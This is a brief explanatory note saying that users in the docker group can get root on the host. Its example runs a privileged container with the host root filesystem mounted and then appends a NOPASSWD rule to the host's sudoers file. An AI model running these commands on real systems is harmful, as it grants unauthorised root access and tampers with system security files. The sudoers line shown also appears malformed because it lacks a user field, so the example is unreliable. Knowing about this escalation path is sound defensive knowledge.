


Users in the docker group can get root on the host, for example:


```
docker run -it --rm --privileged -v /:/mnt ubuntu bash
echo 'ALL=(ALL) NOPASSWD:ALL' >> /mnt/etc/sudoers
```
